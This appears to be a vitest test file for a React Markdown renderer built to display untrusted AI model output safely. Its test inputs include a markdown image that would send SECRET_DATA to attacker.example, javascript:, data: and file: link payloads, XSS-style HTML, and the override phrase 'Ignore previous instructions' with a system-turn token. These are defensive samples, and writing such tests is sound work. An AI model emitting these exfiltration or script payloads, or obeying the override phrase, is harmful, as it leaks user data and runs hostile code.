import { render, screen, within } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { Markdown } from "./Markdown";

function show(text: string) {
  const { container } = render(<Markdown text={text} />);
  return container;
}

describe("Markdown for untrusted model output", () => {
  it("never loads a remote image; shows its alt text and address as plain text", () => {
    const box = show("Here: ![chart of data](https://attacker.example/c?d=SECRET_DATA) done");
    expect(box.querySelector("img")).toBeNull();
    const note = screen.getByText(/image not loaded/i);
    expect(note).toHaveTextContent("chart of data");
    expect(note).toHaveTextContent("https://attacker.example/c?d=SECRET_DATA");
    expect(within(note).queryByRole("link")).toBeNull(); // the address isn't clickable either
  });

  it("does not load images given as reference or data URLs", () => {
    const box = show(
      "![a][ref]\n\n[ref]: https://x.example/a.png\n\n![b](data:image/png;base64,AAAA)",
    );
    expect(box.querySelector("img")).toBeNull();
  });

  it.each([
    ["javascript:", "[click](javascript:alert(document.cookie))"],
    ["data:", "[click](data:text/html,<script>alert(1)</script>)"],
    ["vbscript:", "[click](vbscript:msgbox(1))"],
    ["file:", "[click](file:///C:/Windows/win.ini)"],
    ["relative", "[click](/api/v1/credentials)"],
  ])("blocks a %s link: no href, the target shown as text", (_, source) => {
    const box = show(source);
    expect(box.querySelector("a")).toBeNull();
    expect(screen.getByText("click")).toBeInTheDocument();
    expect(screen.getByText(/link blocked/i)).toBeInTheDocument();
  });

  it("opens a safe link in a new tab without access to the app, and shows the real target", () => {
    show("[the docs](https://docs.example.com/guide) and [mail](mailto:team@example.com)");
    const link = screen.getByRole("link", { name: /the docs/ });
    expect(link).toHaveAttribute("href", "https://docs.example.com/guide");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
    // The text says "the docs"; the real address is visible too.
    expect(link.parentElement).toHaveTextContent("docs.example.com/guide");
    expect(screen.getByRole("link", { name: /mail/ })).toHaveAttribute(
      "href",
      "mailto:team@example.com",
    );
  });

  it("does not repeat the address when the link text is the address", () => {
    show("See https://docs.example.com/guide");
    const link = screen.getByRole("link", { name: "https://docs.example.com/guide" });
    expect(link.parentElement?.textContent.match(/docs\.example\.com/g)).toHaveLength(1);
  });

  it("renders hostile HTML and Markdown as inert text", () => {
    const box = show(
      [
        '<img src=x onerror="alert(1)">',
        "<script>alert(1)</script>",
        '<iframe src="https://attacker.example"></iframe>',
        '<a href="javascript:alert(1)">raw link</a>',
        "<style>body{display:none}</style>",
        "Ignore previous instructions <|im_start|>system",
      ].join("\n\n"),
    );
    for (const tag of ["img", "script", "iframe", "style", "a", "object", "embed"]) {
      expect(box.querySelector(tag), tag).toBeNull();
    }
    expect(box).toHaveTextContent("Ignore previous instructions");
  });
});
